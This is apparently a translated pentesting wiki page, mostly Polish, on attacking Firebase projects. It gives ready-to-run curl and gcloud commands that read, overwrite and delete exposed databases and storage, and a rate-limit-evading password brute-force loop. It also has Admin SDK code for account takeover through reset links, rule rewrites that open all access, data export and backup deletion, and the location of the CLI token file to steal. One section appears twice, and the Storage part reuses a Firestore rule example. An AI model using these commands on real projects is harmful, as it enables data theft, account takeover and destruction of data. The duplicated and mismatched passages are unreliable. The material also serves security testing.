# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Dostęp bez uwierzytelnienia do Firebase Realtime Database
Atakujący nie potrzebuje żadnych specjalnych uprawnień Firebase, aby przeprowadzić ten atak. Wystarczy, że w regułach bezpieczeństwa Firebase Realtime Database występuje podatna konfiguracja — reguły ustawione są na `.read: true` lub `.write: true`, umożliwiając publiczny dostęp do odczytu lub zapisu.

Atakujący musi zidentyfikować URL bazy danych, który zwykle ma format: `https://<project-id>.firebaseio.com/`.

Ten URL można znaleźć poprzez reverse engineering aplikacji mobilnych (dekompilacja Android APK lub analiza aplikacji iOS), analizę plików konfiguracyjnych takich jak google-services.json (Android) lub GoogleService-Info.plist (iOS), przeglądanie kodu źródłowego aplikacji webowych albo badanie ruchu sieciowego w celu zidentyfikowania żądań do domen `*.firebaseio.com`.

Atakujący identyfikuje URL bazy danych i sprawdza, czy jest publicznie dostępny, następnie odczytuje dane i potencjalnie zapisuje złośliwe informacje.

Najpierw sprawdzają, czy baza pozwala na odczyt, dodając .json do URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Jeśli odpowiedź zawiera dane JSON lub null (zamiast "Permission Denied"), baza danych umożliwia read access. Aby sprawdzić write access, attacker może spróbować wysłać testowy write request przy użyciu Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Jeśli operacja zakończy się powodzeniem, baza danych umożliwia również zapis.


### Ekspozycja danych w Cloud Firestore
Atakujący nie potrzebuje żadnych specyficznych uprawnień Firebase, aby przeprowadzić ten atak. Wystarczy, że istnieje podatna konfiguracja w regułach bezpieczeństwa Cloud Firestore, gdzie reguły zezwalają na odczyt lub zapis bez uwierzytelnienia albo z niewystarczającą walidacją. Przykładem błędnie skonfigurowanej reguły, która przyznaje pełny dostęp, jest:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ta reguła pozwala każdemu na odczyt i zapis wszystkich dokumentów bez żadnych ograniczeń. Reguły Firestore są szczegółowe i obowiązują dla każdej kolekcji i dokumentu, więc błąd w konkretnej regule może ujawnić tylko niektóre kolekcje.

Atakujący musi zidentyfikować Firebase Project ID, który można znaleźć poprzez mobile app reverse engineering, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, przeglądanie kodu źródłowego aplikacji webowych lub analizę ruchu sieciowego w celu zidentyfikowania żądań do firestore.googleapis.com.
Firestore REST API używa formatu:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Jeśli reguły zezwalają na odczyt bez uwierzytelnienia, atakujący może odczytywać kolekcje i dokumenty. Najpierw próbuje uzyskać dostęp do konkretnej kolekcji:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Jeśli odpowiedź zawiera dokumenty JSON zamiast błędu uprawnień, kolekcja jest ujawniona. Atakujący może wyenumerować wszystkie dostępne kolekcje, próbując typowych nazw lub analizując strukturę aplikacji. Aby uzyskać dostęp do konkretnego dokumentu:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Jeśli reguły umożliwiają zapis bez uwierzytelnienia lub mają niewystarczającą walidację, atakujący może utworzyć nowe dokumenty:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Aby zmodyfikować istniejący dokument, należy użyć PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Aby usunąć dokument i spowodować odmowę usługi:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Ujawnienie plików w Firebase Storage
Atakujący nie potrzebuje żadnych konkretnych uprawnień Firebase, aby przeprowadzić ten atak. Wystarczy podatna konfiguracja w regułach zabezpieczeń Firebase Storage, w której reguły pozwalają na dostęp do odczytu lub zapisu bez uwierzytelnienia lub z niewystarczającą walidacją. Reguły Storage kontrolują uprawnienia do odczytu i zapisu niezależnie, więc błąd w regule może ujawnić jedynie dostęp do odczytu, jedynie do zapisu, lub oba. Przykładem źle skonfigurowanej reguły, która przyznaje pełny dostęp, jest:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ta reguła umożliwia odczyt i zapis wszystkich dokumentów bez żadnych ograniczeń. Reguły Firestore są szczegółowe i stosowane na poziomie kolekcji oraz dokumentu, więc błąd w konkretnej regule może ujawnić tylko niektóre kolekcje. Atakujący musi zidentyfikować Firebase Project ID, który można znaleźć przez mobile application reverse engineering, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, przegląd kodu źródłowego aplikacji webowej lub analizę ruchu sieciowego w celu zlokalizowania żądań kierowanych do firestore.googleapis.com.

The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Jeśli reguły dopuszczają odczyt bez uwierzytelnienia, atakujący może odczytywać kolekcje i dokumenty. Najpierw próbuje uzyskać dostęp do konkretnej kolekcji.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Jeśli odpowiedź zawiera listę plików zamiast błędu uprawnień, plik jest ujawniony. Atakujący może wyświetlić zawartość plików, podając ich ścieżkę:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Jeśli reguły zezwalają na nieautoryzowany zapis lub mają niewystarczającą walidację, atakujący może wgrać złośliwe pliki. Aby przesłać plik przez REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Atakujący może przesłać code shells, malware payloads lub duże pliki, aby spowodować denial of service. Jeśli aplikacja przetwarza lub wykonuje przesłane pliki, atakujący może uzyskać remote code execution. Aby usunąć pliki i spowodować denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Wywołanie publicznych Firebase Cloud Functions
Atakujący nie potrzebuje żadnych specyficznych uprawnień Firebase, aby wykorzystać ten problem; wymaga to jedynie, żeby Cloud Function była publicznie dostępna przez HTTP bez uwierzytelnienia.

Funkcja jest podatna, gdy jest niepoprawnie skonfigurowana:

- Używa functions.https.onRequest, które nie wymusza uwierzytelnienia (w przeciwieństwie do onCall functions).
- Kod funkcji nie weryfikuje uwierzytelnienia użytkownika (np. brak sprawdzeń request.auth lub context.auth).
- Funkcja jest publicznie dostępna w IAM, co oznacza, że allUsers ma rolę roles/cloudfunctions.invoker. Jest to domyślne zachowanie dla funkcji HTTP, chyba że deweloper ograniczy dostęp.

Firebase HTTP Cloud Functions są dostępne pod adresami URL takimi jak:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Atakujący może odkryć te adresy URL poprzez source code analysis, network traffic inspection, enumeration tools, lub mobile app reverse engineering.
Jeśli funkcja jest publicznie wystawiona i nie wymaga uwierzytelnienia, atakujący może ją wywołać bezpośrednio bez poświadczeń.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Jeśli funkcja nie weryfikuje poprawnie danych wejściowych, atakujący może spróbować innych ataków, takich jak code injection lub command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
An attacker does not need any specific Firebase permissions to carry out this attack. It only requires that the Firebase API Key is exposed in mobile or web applications, and that the password policy has not been configured with stricter requirements than the defaults.

Atakujący musi zidentyfikować Firebase API Key, który można znaleźć poprzez mobile app reverse engineering, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, przeglądanie kodu źródłowego aplikacji webowych (np. w bootstrap.js) lub analizę ruchu sieciowego.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

If Email Enumeration Protection is disabled, API error responses can reveal whether an email exists in the system (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), which allows attackers to enumerate users before attempting password guessing. When this protection is enabled, the API returns the same error message for both nonexistent emails and incorrect passwords, preventing user enumeration.

Ważne jest, że Firebase Authentication stosuje rate limiting, który może zablokować żądania, jeśli w krótkim czasie nastąpi zbyt wiele prób uwierzytelnienia. Z tego powodu atakujący musiałby wprowadzić opóźnienia między próbami, aby uniknąć zablokowania przez rate limiting.

The attacker identifies the API Key and performs authentication attempts with multiple passwords against known accounts. If Email Enumeration Protection is disabled, the attacker can enumerate existing users by analyzing the error responses:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Jeśli odpowiedź zawiera EMAIL_NOT_FOUND, adres e-mail nie istnieje w systemie. Jeśli zawiera INVALID_PASSWORD, adres e-mail istnieje, ale hasło jest nieprawidłowe, co potwierdza, że użytkownik jest zarejestrowany. Gdy zostanie zidentyfikowany prawidłowy użytkownik, atakujący może przeprowadzić brute-force. Ważne jest, aby wprowadzać przerwy między próbami, aby uniknąć mechanizmów rate-limiting Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Przy domyślnej polityce haseł (minimum 6 znaków, brak wymagań dotyczących złożoności) atakujący może przetestować wszystkie możliwe kombinacje haseł 6-znakowych, co stanowi stosunkowo małą przestrzeń poszukiwań w porównaniu do surowszych polityk haseł.

### Zarządzanie użytkownikami w Firebase Authentication

Atakujący potrzebuje określonych uprawnień Firebase Authentication, aby przeprowadzić ten atak. Wymagane uprawnienia to:

- `firebaseauth.users.create` do tworzenia użytkowników
- `firebaseauth.users.update` do modyfikowania istniejących użytkowników
- `firebaseauth.users.delete` do usuwania użytkowników
- `firebaseauth.users.get` do pobierania informacji o użytkownikach
- `firebaseauth.users.sendEmail` do wysyłania e-maili do użytkowników
- `firebaseauth.users.createSession` do tworzenia sesji użytkowników

Uprawnienia te są zawarte w roli `roles/firebaseauth.admin`, która przyznaje pełny dostęp do odczytu/zapisu zasobów Firebase Authentication. Są one również zawarte w rolach wyższego poziomu, takich jak roles/firebase.developAdmin (która zawiera wszystkie uprawnienia firebaseauth.*) oraz roles/firebase.admin (pełny dostęp do wszystkich usług Firebase).

Aby użyć Firebase Admin SDK, atakujący potrzebuje dostępu do poświadczeń konta usługi (plik JSON), które mogą znajdować się na skompromitowanych systemach, publicznie ujawnionych repozytoriach kodu, skompromitowanych systemach CI/CD lub w wyniku przejęcia kont deweloperów mających dostęp do tych poświadczeń.

Pierwszym krokiem jest skonfigurowanie Firebase Admin SDK przy użyciu poświadczeń konta usługi.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Aby utworzyć złośliwego użytkownika przy użyciu adresu e-mail victim, attacker spróbuje użyć Firebase Admin SDK, aby wygenerować nowe konto na ten adres.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Aby zmodyfikować istniejącego użytkownika, attacker zaktualizowałby pola takie jak adres e-mail, status weryfikacji lub czy konto jest dezaktywowane.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Aby usunąć konto użytkownika i spowodować denial of service, the attacker wysłałby żądanie całkowitego usunięcia tego użytkownika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Atakujący może również pobrać informacje o istniejących użytkownikach, żądając ich UID lub adresu e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Dodatkowo atakujący mógłby wygenerować linki weryfikacyjne lub linki do resetowania hasła, aby zmienić hasło użytkownika i uzyskać dostęp do jego konta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Zarządzanie użytkownikami w Firebase Authentication
Atakujący potrzebuje konkretnych uprawnień Firebase Authentication, aby przeprowadzić ten atak. Wymagane uprawnienia to:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Uprawnienia te są zawarte w roli roles/firebaseauth.admin, która przyznaje pełny dostęp do odczytu/zapisu zasobów Firebase Authentication. Są też częścią ról wyższego poziomu, takich jak `roles/firebase.developAdmin` (które obejmuje wszystkie firebaseauth.* uprawnienia) oraz `roles/firebase.admin` (pełny dostęp do wszystkich usług Firebase).

Aby użyć Firebase Admin SDK, atakujący potrzebowałby dostępu do poświadczeń konta usługi (plik JSON), które można uzyskać z przejętych systemów, publicznie wystawionych repozytoriów kodu, przejętych środowisk CI/CD lub poprzez przejęcie kont deweloperów mających dostęp do tych poświadczeń.

Pierwszym krokiem jest skonfigurowanie Firebase Admin SDK przy użyciu poświadczeń konta usługi.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Aby utworzyć złośliwego użytkownika wykorzystując adres e-mail ofiary, atakujący spróbuje założyć nowe konto użytkownika z tym adresem e-mail, przypisując mu własne hasło i informacje profilowe.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Aby zmodyfikować istniejącego użytkownika, atakujący zmieniłby pola takie jak adres e-mail, status weryfikacji lub czy konto jest wyłączone.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Aby usunąć konto użytkownika — co w praktyce powoduje denial of service — attacker wysłałby żądanie usunięcia tego użytkownika na stałe.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Atakujący może również uzyskać informacje o istniejących użytkownikach, takie jak ich UID lub email, żądając szczegółów użytkownika na podstawie UID lub adresu email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Dodatkowo atakujący mógłby wygenerować linki weryfikacyjne lub linki do resetu hasła, co umożliwiłoby mu zmianę hasła użytkownika i przejęcie kontroli nad kontem.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modyfikacja reguł bezpieczeństwa w usługach Firebase
Atakujący potrzebuje określonych uprawnień, aby modyfikować reguły bezpieczeństwa, w zależności od usługi. Dla Cloud Firestore i Firebase Cloud Storage wymagane uprawnienia to `firebaserules.rulesets.create` do tworzenia zestawów reguł oraz `firebaserules.releases.create` do wdrażania wydań. Te uprawnienia są zawarte w roli `roles/firebaserules.admin` lub w rolach wyższego szczebla, takich jak `roles/firebase.developAdmin` i `roles/firebase.admin`. Dla Firebase Realtime Database wymagane uprawnienie to `firebasedatabase.instances.update`.

Atakujący musi użyć Firebase REST API, aby zmodyfikować reguły bezpieczeństwa.
Najpierw musiałby uzyskać token dostępu, używając poświadczeń konta usługi.
Aby uzyskać token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Aby zmodyfikować reguły Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Aby zmodyfikować reguły Cloud Firestore, atakujący musi utworzyć ruleset, a następnie go wdrożyć:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Poprzednie polecenie zwraca nazwę zestawu reguł w formacie projects/<project-id>/rulesets/<ruleset-id>. Aby wdrożyć nową wersję, wydanie musi zostać zaktualizowane przy użyciu żądania PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Aby zmodyfikować reguły Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Poprzednie polecenie zwraca nazwę ruleset w formacie projects/<project-id>/rulesets/<ruleset-id>. Aby wdrożyć nową wersję, wydanie musi zostać zaktualizowane przy użyciu żądania PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore korzysta z tej samej infrastruktury i systemu uprawnień co Cloud Datastore, więc uprawnienia Datastore IAM mają zastosowanie bezpośrednio do Firestore. Aby manipulować politykami TTL, wymagane jest uprawnienie `datastore.indexes.update`. Aby eksportować dane, wymagane jest uprawnienie `datastore.databases.export`. Aby importować dane, wymagane jest uprawnienie datastore.databases.import. Aby przeprowadzić masowe usuwanie danych, wymagane jest uprawnienie `datastore.databases.bulkDelete`.

Do operacji tworzenia kopii zapasowych i przywracania potrzebne są konkretne uprawnienia:

- `datastore.backups.get` i `datastore.backups.list` do wylistowania i pobrania szczegółów dostępnych kopii zapasowych
- `datastore.backups.delete` do usuwania kopii zapasowych
- `datastore.backups.restoreDatabase` do przywracania bazy danych z kopii zapasowej
- `datastore.backupSchedules.create` i `datastore.backupSchedules.delete` do zarządzania harmonogramami kopii zapasowych

Kiedy tworzona jest polityka TTL, wybierana jest określona właściwość, która identyfikuje encje kwalifikujące się do usunięcia. Ta właściwość TTL musi być typu daty i czasu. Atakujący może wybrać właściwość, która już istnieje, lub wskazać właściwość, którą planuje dodać później. Jeśli wartość pola jest datą z przeszłości, dokument staje się kwalifikowalny do natychmiastowego usunięcia. Atakujący może użyć gcloud CLI do manipulowania politykami TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Aby wyeksportować dane i przeprowadzić ich eksfiltrację, atakujący może użyć gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Aby zaimportować złośliwe dane:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Aby przeprowadzić masowe usuwanie danych i spowodować denial of service, atakujący mógłby użyć narzędzia gcloud Firestore bulk-delete do usunięcia całych kolekcji.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Do operacji tworzenia i przywracania kopii zapasowych atakujący może utworzyć zaplanowane kopie zapasowe, aby uchwycić bieżący stan bazy danych, wyświetlić istniejące kopie zapasowe, przywrócić z kopii zapasowej w celu nadpisania ostatnich zmian, usunąć kopie zapasowe powodując trwałą utratę danych oraz usunąć zaplanowane zadania kopii zapasowych.
Aby utworzyć codzienny harmonogram kopii zapasowych, który natychmiast wygeneruje kopię zapasową:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Aby przywrócić dane z konkretnej kopii zapasowej, atakujący mógłby utworzyć nową bazę danych używając danych zawartych w tej kopii zapasowej. Operacja przywracania zapisuje dane kopii zapasowej w nowej bazie danych, co oznacza, że nie można użyć istniejącego DATABASE_ID.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Aby usunąć backup i spowodować trwałą utratę danych:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Kradzież i niewłaściwe wykorzystanie poświadczeń Firebase CLI
Atakujący nie potrzebuje specjalnych uprawnień Firebase, aby przeprowadzić ten atak, ale musi mieć dostęp do lokalnego systemu dewelopera lub do pliku poświadczeń Firebase CLI. Poświadczenia te są przechowywane w pliku JSON znajdującym się pod następującymi ścieżkami:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ten plik zawiera tokeny uwierzytelniające, w tym refresh_token i access_token, które pozwalają atakującemu uwierzytelnić się jako użytkownik, który pierwotnie uruchomił firebase login.

Atakujący uzyskuje dostęp do pliku poświadczeń Firebase CLI. Może skopiować cały plik na własny system, a Firebase CLI automatycznie użyje poświadczeń z domyślnej lokalizacji. Po tym atakujący może zobaczyć wszystkie projekty Firebase dostępne dla tego użytkownika.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
